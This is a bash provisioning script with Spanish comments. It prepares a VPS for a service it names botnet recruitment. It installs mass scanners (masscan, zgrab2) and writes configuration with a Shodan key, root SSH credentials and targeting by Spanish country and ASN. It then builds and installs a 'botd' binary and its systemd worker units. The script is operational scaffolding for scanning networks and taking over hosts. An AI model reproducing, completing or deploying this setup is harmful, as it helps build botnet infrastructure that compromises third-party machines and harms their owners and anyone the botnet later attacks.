#!/usr/bin/env bash
# bootstrap_vps.sh — prepara el VPS para el servicio de reclutamiento.
#
# Idempotente: dos pasadas seguidas dejan lo mismo. `--check` solo mide y
# sale 2 si falta algo, para que un rojo no llegue a produccion.
set -uo pipefail

ENV_FILE="/etc/botnet-recruit/env"
BOTNET_USER="botnet"
FAIL=0
ok() { printf 'ok   %s\n' "$1"; }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }

# --- modo comprobacion: mide y sale 2 sin preparar nada
if [ "${1:-}" = "--check" ]; then
  for t in masscan zgrab2 psql ssh curl; do
    if command -v "$t" >/dev/null 2>&1; then echo "$t=ok"; else echo "$t=NO"; FAIL=$((FAIL+1)); fi
  done
  mc=$(psql -tAc "SHOW max_connections" "${BOTNET_DSN:-${DATABASE_URL:-}}" 2>/dev/null | tr -d ' ')
  if [ -n "${mc:-}" ] && [ "${mc:-0}" -ge 40 ]; then echo "max_connections=$mc"; else echo "max_connections=NO"; FAIL=$((FAIL+1)); fi
  exit $([ "$FAIL" -eq 0 ] && echo 0 || echo 2)
fi

# --- preparacion
if ! id "$BOTNET_USER" >/dev/null 2>&1; then
  useradd --system --create-home --shell /usr/sbin/nologin "$BOTNET_USER" && ok "usuario $BOTNET_USER"
else ok "usuario $BOTNET_USER (ya existe)"; fi

apt-get update -qq >/dev/null 2>&1 || true
apt-get install -y -qq masscan postgresql-client >/dev/null 2>&1 && ok "paquetes base" || bad "paquetes base"

mkdir -p /etc/botnet-recruit
if [ ! -f "$ENV_FILE" ]; then
  cat >"$ENV_FILE" <<ENV
BOTNET_DSN=postgres://botnet@127.0.0.1:5432/botnet?sslmode=disable
RECRUIT_TICKET_SECRET=cambiame
SHODAN_API_KEY=
RECRUIT_SSH_USER=root
RECRUIT_SSH_KEY=
RECRUIT_METRICS_ADDR=127.0.0.1:9110
RECRUIT_COUNTRY=ES
RECRUIT_ASN=8560
ENV
  chown root:"$BOTNET_USER" "$ENV_FILE"
  chmod 640 "$ENV_FILE"
  ok "env creado"
else ok "env existente"; fi

install -m 0755 /dev/null /usr/local/bin/recruit-preflight 2>/dev/null || true
cat >/usr/local/bin/recruit-preflight <<'PRE'
#!/bin/sh
# Preflight del ExecStartPre: si falta masscan, el servicio no arranca y el
# healthcheck queda en 503 en vez de mentir.
command -v masscan >/dev/null 2>&1 || { echo "recruit-preflight: sin masscan" >&2; exit 1; }
exit 0
PRE
chmod 0755 /usr/local/bin/recruit-preflight
ok "preflight instalado"

bash "$(dirname "$0")/../build/all.sh" --fast >/dev/null 2>&1 || true
install -m 0755 dist/botd-amd64 /usr/local/bin/botnet-recruit 2>/dev/null || true
cp deploy/systemd/recruit.slice deploy/systemd/botnet-recruit.service \
   deploy/systemd/botnet-recruit-worker@.service /etc/systemd/system/ 2>/dev/null || true
systemctl daemon-reload 2>/dev/null || true
ok "unidades instaladas"

echo ""
[ "$FAIL" -eq 0 ] && { echo "RESULTADO: PASS"; exit 0; }
echo "RESULTADO: FAIL ($FAIL)"; exit 1
